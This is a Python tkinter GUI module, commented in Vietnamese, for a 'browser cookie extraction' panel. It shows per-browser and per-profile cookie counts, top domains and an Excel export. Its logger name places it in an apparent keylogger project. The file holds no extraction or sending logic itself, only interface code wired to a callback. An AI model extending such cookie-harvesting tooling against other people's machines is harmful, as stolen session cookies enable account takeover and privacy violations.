#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Module chứa CookieFrame - Giao diện trích xuất cookie
"""

import os
import logging
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
from typing import Optional, Callable, Dict, Any, Union

from gui.resources import UIResources

logger = logging.getLogger("keylogger.gui.cookie_frame")

class CookieFrame:
    """Frame giao diện cho chức năng trích xuất cookie từ trình duyệt."""
    
    def __init__(self, parent, callback: Optional[Callable] = None):
        """Khởi tạo frame trích xuất cookie.
        
        Args:
            parent: Widget cha để chứa frame này
            callback: Hàm callback khi trạng thái thay đổi (tùy chọn)
        """
        self.parent = parent
        self.callback = callback
        self.is_extracting = False
        self.progress_window = None
        
        # Biến tkinter
        self.output_dir = tk.StringVar(value=os.path.join(os.path.expanduser("~"), "Documents"))
        
        # Tạo giao diện
        self.create_widgets()
    
    def create_widgets(self):
        """Tạo các thành phần giao diện người dùng."""
        # Frame chính
        self.frame = ttk.Frame(self.parent)
        self.frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        self.frame.grid_columnconfigure(0, weight=1)
        self.frame.grid_rowconfigure(3, weight=1)
        
        # Tiêu đề
        title_frame = ttk.Frame(self.frame)
        title_frame.grid(row=0, column=0, sticky="ew", pady=(0, 10))
        
        title_label = ttk.Label(
            title_frame, text="TRÍCH XUẤT COOKIE TRÌNH DUYỆT", font=("Arial", 16, "bold")
        )
        title_label.pack(pady=10)
        
        # Frame tùy chọn
        options_frame = ttk.LabelFrame(self.frame, text="Tùy chọn")
        options_frame.grid(row=1, column=0, sticky="ew", padx=10, pady=5)
        
        # Thư mục xuất file
        path_frame = ttk.Frame(options_frame)
        path_frame.pack(fill=tk.X, padx=5, pady=10)
        
        ttk.Label(path_frame, text="Thư mục lưu file Excel:").pack(side=tk.LEFT, padx=5)
        output_entry = ttk.Entry(path_frame, textvariable=self.output_dir, width=40)
        output_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        browse_btn = ttk.Button(
            path_frame,
            text="Chọn",
            image=UIResources.get_icon_image("search"),
            compound=tk.LEFT,
            command=self.browse_output_dir,
        )
        browse_btn.pack(side=tk.RIGHT, padx=5)
        
        # Nút trích xuất
        control_frame = ttk.Frame(options_frame)
        control_frame.pack(fill=tk.X, padx=5, pady=10)
        
        # Icon cho nút trích xuất
        cookie_icon = UIResources.get_icon_image("cookie")
        self.extract_btn = ttk.Button(
            control_frame,
            text="Trích xuất cookie",
            image=cookie_icon,
            compound=tk.LEFT,
            command=self.extract_cookies,
        )
        self.extract_btn.image = cookie_icon
        self.extract_btn.pack(side=tk.LEFT, padx=5)
        
        # Khu vực hiển thị trạng thái
        status_frame = ttk.LabelFrame(self.frame, text="Trạng thái")
        status_frame.grid(row=2, column=0, sticky="ew", padx=10, pady=10)
        
        self.status_text = scrolledtext.ScrolledText(
            status_frame, wrap=tk.WORD, height=5, width=60
        )
        self.status_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.status_text.insert(tk.END, "Sẵn sàng trích xuất cookie từ các trình duyệt.\n")
        self.status_text.config(state=tk.DISABLED)
        
        # Khu vực hiển thị kết quả
        result_frame = ttk.LabelFrame(self.frame, text="Kết quả")
        result_frame.grid(row=3, column=0, sticky="nsew", padx=10, pady=10)
        result_frame.grid_columnconfigure(0, weight=1)
        result_frame.grid_rowconfigure(0, weight=1)
        
        self.result_text = scrolledtext.ScrolledText(
            result_frame, wrap=tk.WORD, height=15, width=60
        )
        self.result_text.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        self.result_text.insert(tk.END, "Chưa có kết quả.\n")
        self.result_text.config(state=tk.DISABLED)
    
    def update_status(self, message: str):
        """Cập nhật trạng thái hiện tại.
        
        Args:
            message: Thông báo trạng thái
        """
        self.status_text.config(state=tk.NORMAL)
        self.status_text.insert(tk.END, f"{message}\n")
        self.status_text.see(tk.END)
        self.status_text.config(state=tk.DISABLED)
        
        # Gọi callback nếu có
        if self.callback:
            self.callback({"action": "update_status", "message": message})
    
    def update_result(self, result: Dict[str, Any]):
        """Cập nhật kết quả trích xuất.
        
        Args:
            result: Kết quả trích xuất cookie
        """
        self.result_text.config(state=tk.NORMAL)
        self.result_text.delete(1.0, tk.END)
        
        if result["success"]:
            self.result_text.insert(tk.END, f"TRÍCH XUẤT THÀNH CÔNG\n\n", "success")
            self.result_text.insert(tk.END, f"Tổng số cookie: {result['total_cookies']}\n")
            self.result_text.insert(tk.END, f"Số domain: {len(result['unique_domains'])}\n")
            self.result_text.insert(tk.END, f"File Excel: {result['excel_path']}\n\n")
            
            # Thống kê theo trình duyệt
            self.result_text.insert(tk.END, "THỐNG KÊ THEO TRÌNH DUYỆT:\n", "header")
            for browser, info in result["browsers"].items():
                self.result_text.insert(tk.END, f"  {browser}: {info['cookie_count']} cookie\n", "browser")
                for profile in info["profiles"]:
                    self.result_text.insert(tk.END, f"    - {profile['name']}: {profile['cookie_count']} cookie\n")
            
            # Thống kê domain
            if result["unique_domains"]:
                self.result_text.insert(tk.END, "\nTOP DOMAIN (số lượng cookie):\n", "header")
                
                # Ở đây chỉ trình bày một số domain, xếp hạng chi tiết sẽ được thực hiện trong module xử lý
                domain_list = list(result["unique_domains"])
                top_domains = domain_list[:10] if len(domain_list) > 10 else domain_list
                
                for domain in top_domains:
                    self.result_text.insert(tk.END, f"  {domain}\n", "domain")
        else:
            self.result_text.insert(tk.END, "TRÍCH XUẤT THẤT BẠI\n\n", "error")
            self.result_text.insert(tk.END, f"Lỗi: {result['message']}\n")
        
        self.result_text.see(tk.END)
        
        # Tạo tag cho định dạng văn bản
        self.result_text.tag_configure("success", foreground="green", font=("Arial", 12, "bold"))
        self.result_text.tag_configure("error", foreground="red", font=("Arial", 12, "bold"))
        self.result_text.tag_configure("header", foreground="blue", font=("Arial", 10, "bold"))
        self.result_text.tag_configure("browser", foreground="purple", font=("Arial", 10, "bold"))
        self.result_text.tag_configure("domain", foreground="brown")
        
        self.result_text.config(state=tk.DISABLED)
    
    def browse_output_dir(self):
        """Chọn thư mục xuất file."""
        directory = filedialog.askdirectory(initialdir=self.output_dir.get())
        if directory:
            self.output_dir.set(directory)
    
    def extract_cookies(self):
        """Trích xuất cookie từ các trình duyệt."""
        if self.is_extracting:
            messagebox.showinfo("Thông báo", "Đang trích xuất cookie, vui lòng đợi...")
            return
        
        # Kiểm tra thư mục xuất file
        output_dir = self.output_dir.get()
        if not os.path.exists(output_dir):
            try:
                os.makedirs(output_dir, exist_ok=True)
            except Exception as e:
                messagebox.showerror("Lỗi", f"Không thể tạo thư mục xuất file: {e}")
                return
        
        # Hiển thị cửa sổ tiến trình
        self.progress_window = tk.Toplevel(self.parent)
        self.progress_window.title("Đang trích xuất cookie")
        self.progress_window.geometry("300x100")
        self.progress_window.resizable(False, False)
        self.progress_window.transient(self.parent)
        self.progress_window.grab_set()
        
        ttk.Label(self.progress_window, text="Đang trích xuất cookie từ các trình duyệt...").pack(pady=10)
        progress = ttk.Progressbar(self.progress_window, mode="indeterminate")
        progress.pack(fill=tk.X, padx=20)
        progress.start()
        
        # Cập nhật trạng thái
        self.update_status("Bắt đầu trích xuất cookie từ các trình duyệt...")
        self.extract_btn.config(state=tk.DISABLED)
        self.is_extracting = True
        
        # Gọi callback để thực hiện trích xuất
        if self.callback:
            self.callback({
                "action": "extract_cookies", 
                "output_dir": output_dir,
                "callback": self.on_extraction_complete
            })
    
    def on_extraction_complete(self, result: Dict[str, Any]):
        """Callback khi trích xuất hoàn tất.
        
        Args:
            result: Kết quả trích xuất cookie
        """
        # Đóng cửa sổ tiến trình
        if self.progress_window:
            self.progress_window.destroy()
            self.progress_window = None
        
        # Cập nhật trạng thái
        if result["success"]:
            self.update_status(f"Trích xuất thành công. Đã tìm thấy {result['total_cookies']} cookie từ {len(result['browsers'])} trình duyệt.")
            self.update_status(f"Đã xuất ra file Excel: {result['excel_path']}")
            
            # Hỏi người dùng có muốn mở file Excel không
            if os.path.exists(result["excel_path"]):
                if messagebox.askyesno("Thành công", f"Đã trích xuất thành công {result['total_cookies']} cookie và xuất ra file Excel. Bạn có muốn mở file không?"):
                    if self.callback:
                        self.callback({
                            "action": "open_file",
                            "file_path": result["excel_path"]
                        })
        else:
            self.update_status(f"Trích xuất thất bại. Lỗi: {result['message']}")
        
        # Cập nhật kết quả
        self.update_result(result)
        
        # Khôi phục trạng thái
        self.extract_btn.config(state=tk.NORMAL)
        self.is_extracting = False
    
    def get_frame(self):
        """Trả về frame chính để thêm vào container."""
        return self.frame